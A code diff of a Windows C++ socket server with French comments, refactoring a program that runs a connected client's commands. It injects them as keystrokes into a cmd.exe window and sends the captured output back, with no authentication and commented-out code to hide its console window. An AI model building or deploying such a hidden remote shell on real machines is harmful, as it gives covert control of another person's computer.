@@ -4,7 +4,7 @@
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
-// Importations initiales
+// Importations
 
 #include <windows.h>
 #include <winsock2.h>
@@ -21,35 +21,27 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-// Namespaces
-
+// Namespace
 using namespace std;
-namespace fs = filesystem;
 
-// M�thode de v�rification des bytesRecv
-bool bytesVerification(int bytesReceveid) {
+// String pré-enregistrés
 
-	if (bytesReceveid <= 0) {
-		cout << "Une erreur de reception s'est produite" << endl;
-		// TODO : Socket close et retirer du master fd_set
-		return false;
-	}
-	return true;
-}
+const string servMsg = "<SERVER> ";
+const string clientMsg = "<CLIENT> ";
+const string errorMsg = "<ERROR> ";
 
+// Méthodes supplémentaires
+
+bool bytesVerification(int bytesReceveid);
+void sendFileToClient(string path, SOCKET sock);
 
 // Main
+
 int main() {
 
 	// Cacher la fênêtre d'execution
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	//ShowWindow(GetConsoleWindow(), SW_RESTORE);
-
-	// String pr�-enregistr�s
-
-	const string servMsg = "<SERVER> ";
-	const string clientMsg = "<CLIENT> ";
-	const string errorMsg = "<ERROR> ";
 
 	// Initialisation de WinShock
 
@@ -149,7 +141,7 @@ int main() {
 				}
 			}
 
-			// Nous souhaitons communiquer avec un socketClient d�j� existant
+			// Nous souhaitons communiquer avec un socketClient déjà existant
 
 			else {
 
@@ -162,25 +154,27 @@ int main() {
 
 				string commande = "";
 				
+				ifstream file;
+
 				const string path = "output.txt";
 				const string errorPath = "error.txt";
 				long fileSize = 0;
 
-				// On recoit les commandes du client
+				// Réception de la commande du client
 
 				ZeroMemory(buf, 4096);
 				bytesReceived = recv(sock, buf, 4096, 0);
 
 				if (bytesVerification(bytesReceived)) {
 
-					commande = string(buf, 0, bytesReceived);
-					cout << clientMsg <<"La commande a executer est " << commande << endl;
+					// Transformation de la commande et affichage
+
+					commande = string(buf, 0, bytesReceived) + " > " + path + " 2> " + errorPath;
+					cout << clientMsg <<"La commande est " << commande << endl;
 
 					// On execute la commande du client dans le CMD
 
 					windowCMD = FindWindow(L"ConsoleWindowClass", L"C:\\WINDOWS\\system32\\cmd.exe");
-
-					commande += " > " + path + " 2> " + errorPath;
 
 					for (auto c : commande) {
 						SendMessage(windowCMD, WM_CHAR, c, NULL);
@@ -188,100 +182,26 @@ int main() {
 					SendMessage(windowCMD, WM_CHAR, '\r', NULL);
 				}
 				
-				Sleep(1000); // Très important !!!!
+				Sleep(1000);
 
-				// Lecture et envoie du ouput du CMD
+				// Observation de la taille de "output.txt" afin d'observer une erreur potentielle
 
-				ifstream file(path, ios::binary);
+				file.open(path, ios::binary);
 
 				if (file.is_open()) {
 
-					Sleep(1000); // Très important !!!
-
-					cout << file.rdbuf() << endl; // Affichage du contenu du "output.txt"
-
-					cout << servMsg << "Fichier ouvert!" << endl;
-
-					// Envoyer la taille (octets) du fichier
+					Sleep(1000);
 
 					file.seekg(0, ios::end);
 					fileSize = file.tellg();
-					cout << servMsg << "La taille du fichier est de " << (int)fileSize << endl;
-
-					// Vérification s'il n'y pas eu une erreur
-
-					if ((int)fileSize > 0 ) {
-						send(sock, (char*)&fileSize, sizeof(long), 0);
-
-						// Recevoir un message de confirmation du client (On se fou du message / pas obligé de l'afficher)
-
-						ZeroMemory(buf, 4096);
-						bytesReceived = recv(sock, buf, 4096, 0);
-						cout << clientMsg << "Confirmation obtenue!" << endl;
-						ZeroMemory(buf, 4096);
-
-						// Envoyer le fichier partie par partie
-
-						file.seekg(0, ios::beg);
-
-						do {
-
-							// Lecture du fichier et envoie
-
-							file.read(buf, 4096);
-
-							if (file.gcount() > 0)
-								send(sock, buf, file.gcount(), 0);
-
-						} while (file.gcount() > 0);
-
-						cout << servMsg << "Envoie termine!" << endl;
-					}
-					else { // Il y a une erreur
-
-						file.close();
-						
-						file.open(errorPath, ios::binary);
-
-						file.seekg(0, ios::end);
-						fileSize = file.tellg();
-						cout << servMsg << "La taille du fichier erreur est de " << (int)fileSize << endl;
-
-						if (file.is_open()) {
-							
-							send(sock, (char*)&fileSize, sizeof(long), 0);
-
-							// Recevoir un message de confirmation du client (On se fou du message / pas obligé de l'afficher)
-
-							ZeroMemory(buf, 4096);
-							bytesReceived = recv(sock, buf, 4096, 0);
-							cout << clientMsg << "Confirmation obtenue!" << endl;
-							ZeroMemory(buf, 4096);
-
-							// Envoyer le fichier partie par partie
-
-							file.seekg(0, ios::beg);
-
-							do {
-
-								// Lecture du fichier et envoie
-
-								file.read(buf, 4096);
-
-								if (file.gcount() > 0)
-									send(sock, buf, file.gcount(), 0);
-
-							} while (file.gcount() > 0);
-
-							cout << servMsg << "Envoie termine!" << endl;
-						}
-					}
 					
-					file.clear(); // Clear juste avant de recommencer, ca va permettre la gestion des erreurs
-
 					file.close();
+					ZeroMemory(buf, 4096);
 
-
+					if (fileSize > 0) // La commande est valide
+						sendFileToClient(path, sock);
+					else
+						sendFileToClient(errorPath, sock);
 				}
 				else
 					cout << errorMsg << "Erreur lors de l'ouverture" << endl;
@@ -291,4 +211,63 @@ int main() {
 
 	// M�nage de WinSock
 	WSACleanup();
+}
+
+
+bool bytesVerification(int bytesReceveid) {
+
+	if (bytesReceveid <= 0) {
+		cout << "Une erreur de reception s'est produite" << endl;
+		// TODO : Socket close et retirer du master fd_set
+		return false;
+	}
+	return true;
+}
+
+void sendFileToClient(string path, SOCKET sock) {
+
+	// Variables
+
+	char buf[4096];
+	int bytesReceived = 0;
+
+	ifstream file(path, ios::binary);
+	long fileSize;
+
+	// Envoie de la taille du fichier
+
+	file.seekg(0, ios::end);
+	fileSize = file.tellg();
+
+	send(sock, (char*)&fileSize, sizeof(long), 0);
+
+	// Réception d'un message de confirmation
+
+	ZeroMemory(buf, 4096);
+	bytesReceived = recv(sock, buf, 4096, 0);
+
+	if (bytesVerification(bytesReceived)) {
+
+		cout << clientMsg << "Confirmation obtenue!" << endl;
+
+		ZeroMemory(buf, 4096);
+
+		// Envoie du fichier morceaux par morceaux
+
+		file.seekg(0, ios::beg);
+
+		do {
+			// Lecture du fichier et envoie
+
+			file.read(buf, 4096);
+			if (file.gcount() > 0)
+				send(sock, buf, file.gcount(), 0);
+
+		} while (file.gcount() > 0);
+
+		cout << servMsg << "Envoie complete!" << endl;
+
+		file.clear();
+		file.close();
+	}
 }
